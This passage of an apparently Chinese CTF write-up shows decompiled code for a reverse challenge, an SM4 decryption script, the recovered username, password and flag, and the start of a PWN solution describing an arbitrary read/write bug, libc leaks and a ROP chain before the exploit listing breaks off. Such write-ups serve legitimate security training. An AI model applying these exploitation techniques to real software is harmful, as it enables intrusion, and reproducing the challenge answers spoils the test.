class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // rax</span><br><span class="line">  char *s1; // ST28_8</span><br><span class="line">  char v5; // ST1B_1</span><br><span class="line">  unsigned __int8 i; // [rsp+19h] [rbp-1A7h]</span><br><span class="line">  int v8; // [rsp+1Ch] [rbp-1A4h]</span><br><span class="line">  void *v9; // [rsp+20h] [rbp-1A0h]</span><br><span class="line">  char v10; // [rsp+30h] [rbp-190h]</span><br><span class="line">  __int64 v11; // [rsp+140h] [rbp-80h]</span><br><span class="line">  char v12; // [rsp+148h] [rbp-78h]</span><br><span class="line">  __int64 v13; // [rsp+150h] [rbp-70h]</span><br><span class="line">  __int64 v14; // [rsp+158h] [rbp-68h]</span><br><span class="line">  __int64 v15; // [rsp+160h] [rbp-60h]</span><br><span class="line">  __int64 v16; // [rsp+168h] [rbp-58h]</span><br><span class="line">  char v17; // [rsp+170h] [rbp-50h]</span><br><span class="line">  char v18; // [rsp+171h] [rbp-4Fh]</span><br><span class="line">  char v19; // [rsp+172h] [rbp-4Eh]</span><br><span class="line">  char v20; // [rsp+173h] [rbp-4Dh]</span><br><span class="line">  char v21; // [rsp+174h] [rbp-4Ch]</span><br><span class="line">  char v22; // [rsp+175h] [rbp-4Bh]</span><br><span class="line">  char v23; // [rsp+176h] [rbp-4Ah]</span><br><span class="line">  char v24; // [rsp+177h] [rbp-49h]</span><br><span class="line">  char v25; // [rsp+178h] [rbp-48h]</span><br><span class="line">  char v26; // [rsp+179h] [rbp-47h]</span><br><span class="line">  char v27; // [rsp+17Ah] [rbp-46h]</span><br><span class="line">  char v28; // [rsp+17Bh] [rbp-45h]</span><br><span class="line">  char v29; // [rsp+17Ch] [rbp-44h]</span><br><span class="line">  char v30; // [rsp+17Dh] [rbp-43h]</span><br><span class="line">  char v31; // [rsp+17Eh] [rbp-42h]</span><br><span class="line">  char v32; // [rsp+17Fh] [rbp-41h]</span><br><span class="line">  __int64 v33; // [rsp+180h] [rbp-40h]</span><br><span class="line">  __int64 v34; // [rsp+188h] [rbp-38h]</span><br><span class="line">  char s[8]; // [rsp+190h] [rbp-30h]</span><br><span class="line">  __int64 v36; // [rsp+198h] [rbp-28h]</span><br><span class="line">  __int64 v37; // [rsp+1A0h] [rbp-20h]</span><br><span class="line">  __int64 v38; // [rsp+1A8h] [rbp-18h]</span><br><span class="line">  char v39; // [rsp+1B0h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v40; // [rsp+1B8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v40 = __readfsqword(0x28u);</span><br><span class="line">  v9 = malloc(0x4D0uLL);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  puts(&quot;Powered by ????? !&quot;);</span><br><span class="line">  sub_406656(&quot;Powered by ????? !&quot;, 0LL);</span><br><span class="line">  puts(&quot;---------[LOGIN]---------&quot;);</span><br><span class="line">  printf(&quot;Username:&quot;, a2);</span><br><span class="line">  vm_index((__int64)v9);</span><br><span class="line">  v11 = 0LL;</span><br><span class="line">  v12 = 0;</span><br><span class="line">  __isoc99_scanf(&quot;%9s&quot;, &amp;v11);</span><br><span class="line">  printf(&quot;\x1B[?25l&quot;, &amp;v11);</span><br><span class="line">  printf(&quot;Password:&quot;);</span><br><span class="line">  for ( i = 0; i &lt;= 5u; ++i )</span><br><span class="line">    read(0, (char *)ptr + 4 * (i + 36LL), 1uLL);</span><br><span class="line">  vm((__int64)v9);</span><br><span class="line">  *(_QWORD *)s = 0LL;</span><br><span class="line">  v36 = 0LL;</span><br><span class="line">  v37 = 0LL;</span><br><span class="line">  v38 = 0LL;</span><br><span class="line">  v39 = 0;</span><br><span class="line">  v13 = 0LL;</span><br><span class="line">  v14 = 0LL;</span><br><span class="line">  str_to_hex((__int64)&amp;v11, (__int64)&amp;v13, 8);</span><br><span class="line">  v15 = 0LL;</span><br><span class="line">  v16 = 0LL;</span><br><span class="line">  v17 = -38;</span><br><span class="line">  v18 = -104;</span><br><span class="line">  v19 = -15;</span><br><span class="line">  v20 = -38;</span><br><span class="line">  v21 = 49;</span><br><span class="line">  v22 = 42;</span><br><span class="line">  v23 = -73;</span><br><span class="line">  v24 = 83;</span><br><span class="line">  v25 = -91;</span><br><span class="line">  v26 = 112;</span><br><span class="line">  v27 = 58;</span><br><span class="line">  v28 = 11;</span><br><span class="line">  v29 = -3;</span><br><span class="line">  v30 = 41;</span><br><span class="line">  v31 = 13;</span><br><span class="line">  v32 = -42;</span><br><span class="line">  v33 = 0LL;</span><br><span class="line">  v34 = 0LL;</span><br><span class="line">  sub_401738(&amp;v10, (unsigned __int8 *)&amp;v17);</span><br><span class="line">  sub_4018C4((__int64)&amp;v10, 1, 16, &amp;v15, &amp;v13, &amp;v33);</span><br><span class="line">  sub_4067BD((__int64)&amp;v33, (__int64)s, 16);</span><br><span class="line">  v3 = strlen(s);</span><br><span class="line">  s1 = base64_encode(s, v3);</span><br><span class="line">  v5 = strcmp(s1, &quot;RVYtG85NQ9OPHU4uQ8AuFM+MHVVrFMJMR8FuF8WJQ8Y=&quot;);</span><br><span class="line">  printf(&quot;\x1B[?25h&quot;, &quot;RVYtG85NQ9OPHU4uQ8AuFM+MHVVrFMJMR8FuF8WJQ8Y=&quot;);</span><br><span class="line">  v8 = *((_DWORD *)ptr + 25);</span><br><span class="line">  sub_405AA8();</span><br><span class="line">  if ( v5 || v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;\n----------[EXIT]----------&quot;);</span><br><span class="line">    system(&quot;exit&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;\n---------[WELCOME]---------&quot;);</span><br><span class="line">    system(&quot;cat flag&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>分别读取了用户名和6位的密码</p>
<p>对于输入用户名的字符串，首先是把输入转成16进制字符串（一位变两位），然后是一个SMS4加密（通过关键数值可以确定加密算法0xA3B1BAC6），然后是又一个魔改的base64加密，最后与正确字符串进行比较</p>
<p>解密魔改脚本和上面第一题的一样，把index_table改一下就可以了，解密出来的字符串如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EF468DBAF985B2509C9E200CF3525AB6</span><br></pre></td></tr></table></figure></p>
<p>SMS4解密脚本是在网上找到的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf-8-*-</span><br><span class="line">from print_log import *</span><br><span class="line">import copy</span><br><span class="line"></span><br><span class="line">#Expanded SM4 S-boxes    Sbox table: 8bits input convert to 8 bits output</span><br><span class="line">SboxTable = [</span><br><span class="line">0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05,</span><br><span class="line">0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99,</span><br><span class="line">0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62,</span><br><span class="line">0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6,</span><br><span class="line">0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8,</span><br><span class="line">0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35,</span><br><span class="line">0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,</span><br><span class="line">0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,</span><br><span class="line">0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,</span><br><span class="line">0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,</span><br><span class="line">0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,</span><br><span class="line">0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,</span><br><span class="line">0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,</span><br><span class="line">0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,</span><br><span class="line">0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84,</span><br><span class="line">0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># System parameter</span><br><span class="line">FK = [0xa3b1bac6,0x56aa3350,0x677d9197,0xb27022dc]</span><br><span class="line"></span><br><span class="line"># fixed parameter</span><br><span class="line">CK = [</span><br><span class="line">0x00070e15,0x1c232a31,0x383f464d,0x545b6269,</span><br><span class="line">0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9,</span><br><span class="line">0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,</span><br><span class="line">0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9,</span><br><span class="line">0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,</span><br><span class="line">0x30373e45,0x4c535a61,0x686f767d,0x848b9299,</span><br><span class="line">0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,</span><br><span class="line">0x10171e25,0x2c333a41,0x484f565d,0x646b7279</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">ENCRYPT = 0</span><br><span class="line">DECRYPT = 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GET_UINT32_BE(key_data):</span><br><span class="line">    tmp_data = int((key_data[0] &lt;&lt; 24) | (key_data[1] &lt;&lt; 16) | (key_data[2] &lt;&lt; 8) | (key_data[3]))</span><br><span class="line">    return tmp_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def PUT_UINT32_BE(n):</span><br><span class="line">    return [int((n&gt;&gt;24)&amp;0xff), int((n&gt;&gt;16)&amp;0xff), int((n&gt;&gt;8)&amp;0xff), int((n)&amp;0xff)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># rotate shift left marco definition</span><br><span class="line">def SHL(x, n):</span><br><span class="line">    xx = int(int(x &lt;&lt; n) &amp; 0xffffffff)</span><br><span class="line">    return xx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ROTL(x, n):</span><br><span class="line">    xx = SHL(x, n)</span><br><span class="line">    yy = xx | int((x &gt;&gt; (32 - n)) &amp; 0xffffffff)</span><br><span class="line">    return yy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def XOR(a, b):</span><br><span class="line">    return list(map(lambda x, y: x ^ y, a, b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># look up in SboxTable and get the related value.</span><br><span class="line"># args:    [in] inch: 0x00~0xFF (8 bits unsigned value).</span><br><span class="line">def sm4Sbox(idx):</span><br><span class="line">    return SboxTable[idx]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Calculating round encryption key.</span><br><span class="line"># args:    [in] a: a is a 32 bits unsigned value;</span><br><span class="line"># return: sk[i]: i&#123;0,1,2,3,...31&#125;.</span><br><span class="line">def sm4CalciRK(ka):</span><br><span class="line">    b = [0, 0, 0, 0]</span><br><span class="line">    a = PUT_UINT32_BE(ka)</span><br><span class="line">    b[0] = sm4Sbox(a[0])</span><br><span class="line">    b[1] = sm4Sbox(a[1])</span><br><span class="line">    b[2] = sm4Sbox(a[2])</span><br><span class="line">    b[3] = sm4Sbox(a[3])</span><br><span class="line">    bb = GET_UINT32_BE(b[0:4])</span><br><span class="line">    rk = bb ^ (ROTL(bb, 13)) ^ (ROTL(bb, 23))</span><br><span class="line">    return rk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># private F(Lt) function:</span><br><span class="line"># &quot;T algorithm&quot; == &quot;L algorithm&quot; + &quot;t algorithm&quot;.</span><br><span class="line"># args:    [in] a: a is a 32 bits unsigned value;</span><br><span class="line"># return: c: c is calculated with line algorithm &quot;L&quot; and nonline algorithm &quot;t&quot;</span><br><span class="line">def sm4Lt(ka):</span><br><span class="line">    b = [0, 0, 0, 0]</span><br><span class="line">    a = PUT_UINT32_BE(ka)</span><br><span class="line">    b[0] = sm4Sbox(a[0])</span><br><span class="line">    b[1] = sm4Sbox(a[1])</span><br><span class="line">    b[2] = sm4Sbox(a[2])</span><br><span class="line">    b[3] = sm4Sbox(a[3])</span><br><span class="line">    bb = GET_UINT32_BE(b[0:4])</span><br><span class="line">    c = bb ^ (ROTL(bb, 2)) ^ (ROTL(bb, 10)) ^ (ROTL(bb, 18)) ^ (ROTL(bb, 24))</span><br><span class="line">    return c</span><br><span class="line"></span><br><span class="line"># private F function:</span><br><span class="line"># Calculating and getting encryption/decryption contents.</span><br><span class="line"># args:    [in] x0: original contents;</span><br><span class="line"># args:    [in] x1: original contents;</span><br><span class="line"># args:    [in] x2: original contents;</span><br><span class="line"># args:    [in] x3: original contents;</span><br><span class="line"># args:    [in] rk: encryption/decryption key;</span><br><span class="line"># return the contents of encryption/decryption contents.</span><br><span class="line">def sm4F(x0, x1, x2, x3, rk):</span><br><span class="line">    return (x0 ^ sm4Lt(x1 ^ x2 ^ x3 ^ rk))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Sm4(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.sk = [0]*32</span><br><span class="line">        self.mode = ENCRYPT</span><br><span class="line"></span><br><span class="line">    def sm4_set_key(self, key_data, mode):</span><br><span class="line">        self.sm4_setkey(key_data, mode)</span><br><span class="line"></span><br><span class="line">    def sm4_setkey(self, key, mode):</span><br><span class="line">        MK = [0, 0, 0, 0]</span><br><span class="line">        k = [0]*36</span><br><span class="line">        MK[0] = GET_UINT32_BE(key[0:4])</span><br><span class="line">        MK[1] = GET_UINT32_BE(key[4:8])</span><br><span class="line">        MK[2] = GET_UINT32_BE(key[8:12])</span><br><span class="line">        MK[3] = GET_UINT32_BE(key[12:16])</span><br><span class="line">        k[0:4] = XOR(MK[0:4], FK[0:4])</span><br><span class="line">        for i in range(32):</span><br><span class="line">            k[i + 4] = k[i] ^ (sm4CalciRK(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ CK[i]))</span><br><span class="line">            self.sk[i] = k[i + 4]</span><br><span class="line">        self.mode = mode</span><br><span class="line">        if mode == DECRYPT:</span><br><span class="line">            for idx in range(16):</span><br><span class="line">                t = self.sk[idx]</span><br><span class="line">                self.sk[idx] = self.sk[31 - idx]</span><br><span class="line">                self.sk[31 - idx] = t</span><br><span class="line"></span><br><span class="line">    def sm4_one_round(self, sk, in_put):</span><br><span class="line">        out_put = []</span><br><span class="line">        ulbuf = [0]*36</span><br><span class="line">        ulbuf[0] = GET_UINT32_BE(in_put[0:4])</span><br><span class="line">        ulbuf[1] = GET_UINT32_BE(in_put[4:8])</span><br><span class="line">        ulbuf[2] = GET_UINT32_BE(in_put[8:12])</span><br><span class="line">        ulbuf[3] = GET_UINT32_BE(in_put[12:16])</span><br><span class="line">        for idx in range(32):</span><br><span class="line">            ulbuf[idx + 4] = sm4F(ulbuf[idx], ulbuf[idx + 1], ulbuf[idx + 2], ulbuf[idx + 3], sk[idx])</span><br><span class="line"></span><br><span class="line">        out_put += PUT_UINT32_BE(ulbuf[35])</span><br><span class="line">        out_put += PUT_UINT32_BE(ulbuf[34])</span><br><span class="line">        out_put += PUT_UINT32_BE(ulbuf[33])</span><br><span class="line">        out_put += PUT_UINT32_BE(ulbuf[32])</span><br><span class="line">        return out_put</span><br><span class="line"></span><br><span class="line">    def sm4_crypt_ecb(self, input_data):</span><br><span class="line">        # SM4-ECB block encryption/decryption</span><br><span class="line">        length = len(input_data)</span><br><span class="line">        i = 0</span><br><span class="line">        output_data = []</span><br><span class="line">        while length &gt; 0:</span><br><span class="line">            output_data += self.sm4_one_round(self.sk, input_data[i:i+16])</span><br><span class="line">            i += 16</span><br><span class="line">            length -= 16</span><br><span class="line">        return output_data</span><br><span class="line"></span><br><span class="line">    def sm4_crypt_cbc(self, iv, input_data):</span><br><span class="line">        #SM4-CBC buffer encryption/decryption</span><br><span class="line">        length = len(input_data)</span><br><span class="line">        i = 0</span><br><span class="line">        output_data = []</span><br><span class="line">        tmp_input = [0]*16</span><br><span class="line">        if self.mode == ENCRYPT:</span><br><span class="line">            while length &gt; 0:</span><br><span class="line">                tmp_input[0:16] = XOR(input_data[i:i+16], iv[0:16])</span><br><span class="line">                output_data += self.sm4_one_round(self.sk, tmp_input[0:16])</span><br><span class="line">                iv = copy.deepcopy(output_data[i:i+16])</span><br><span class="line">                i += 16</span><br><span class="line">                length -= 16</span><br><span class="line">        else:</span><br><span class="line">            while length &gt; 0:</span><br><span class="line">                output_data += self.sm4_one_round(self.sk, input_data[i:i+16])</span><br><span class="line">                output_data[i:i+16] = XOR(output_data[i:i+16], iv[0:16])</span><br><span class="line">                iv = copy.deepcopy(input_data[i:i + 16])</span><br><span class="line">                i += 16</span><br><span class="line">                length -= 16</span><br><span class="line">        return output_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def sm4_crypt_ecb(mode, key, data):</span><br><span class="line">    sm4_d = Sm4()</span><br><span class="line">    sm4_d.sm4_set_key(key, mode)</span><br><span class="line">    en_data = sm4_d.sm4_crypt_ecb(data)</span><br><span class="line">    return en_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def sm4_crypt_cbc(mode, key, iv, data):</span><br><span class="line">    sm4_d = Sm4()</span><br><span class="line">    sm4_d.sm4_set_key(key, mode)</span><br><span class="line">    en_data = sm4_d.sm4_crypt_cbc(iv, data)</span><br><span class="line">    return en_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    log_init()</span><br><span class="line"> </span><br><span class="line">    key_data = [0xDA,0x98,0xF1,0xDA,0x31,0x2A,0xB7,0x53,0xA5,0x70,0x3A,0xB,0xFD,0x29,0xd,0xD6]  #key</span><br><span class="line">    input_data = [0xEF,0x46,0x8D,0xBA,0xF9,0x85,0xB2,0x50,0x9C,0x9E,0x20,0x0C,0xF3,0x52,0x5A,0xB6] # 密文 </span><br><span class="line">    sm4_d = Sm4()</span><br><span class="line">    sm4_d.sm4_set_key(key_data, DECRYPT)##ENCRYPT 加密是0 解密是1</span><br><span class="line">    de_data = sm4_d.sm4_crypt_ecb(input_data)#解密</span><br><span class="line">    print_data(de_data, &quot;de_data:&quot;)</span><br></pre></td></tr></table></figure></p>
<p>解密出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x36 0x32 0x36 0x31 0x36 0x34 0x37 0x32 0x36 0x35 0x37 0x32 0x33 0x31 0x33 0x32</span><br></pre></td></tr></table></figure></p>
<p>在经过两字16进制解码的出来用户名“badrer12”</p>
<p>密码部分是一个VM来处理的，VM部分太长了，，我分析了好长时间，并不知道VM到底干了些什么，于是动态调试一波</p>
<p>首先在我们输入的字符串下断点（我输入的是123456）<br><img src="https://s2.ax1x.com/2019/04/25/EezJ7q.png" alt><br>通过对该地址的引用和处理，最后发现在内存中和我输入的密码在一块，尝试了一下发现确实是正确的密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xyz[|]</span><br></pre></td></tr></table></figure></p>
<p><img src="https://s2.ax1x.com/2019/04/25/EeztA0.png" alt> </p>
<h4 id="flag-flag-eafd-134g-vp1d-vsdr-v5yg-ai0g-fsdg-g24t-sdfg"><a href="#flag-flag-eafd-134g-vp1d-vsdr-v5yg-ai0g-fsdg-g24t-sdfg" class="headerlink" title="flag:flag{eafd_134g_vp1d_vsdr_v5yg_ai0g_fsdg_g24t_sdfg}"></a>flag:flag{eafd_134g_vp1d_vsdr_v5yg_ai0g_fsdg_g24t_sdfg}</h4><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="your-pwn"><a href="#your-pwn" class="headerlink" title="your_pwn"></a>your_pwn</h3><p>保护全开，漏洞点在sub_B35函数，index索引没有控制大小，导致任意地址读和任意地址写，泄露libc地址和泄露程序基地址，方法是在main函数栈中有一个__libc_start_main+231和push r15，可以通过泄露这两个地址计算出来libc地址和基地址，进而ROP控制程序流程，不过这个ROP是一个一个字节写的<br>exp：（需要用到LibcSearcher）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 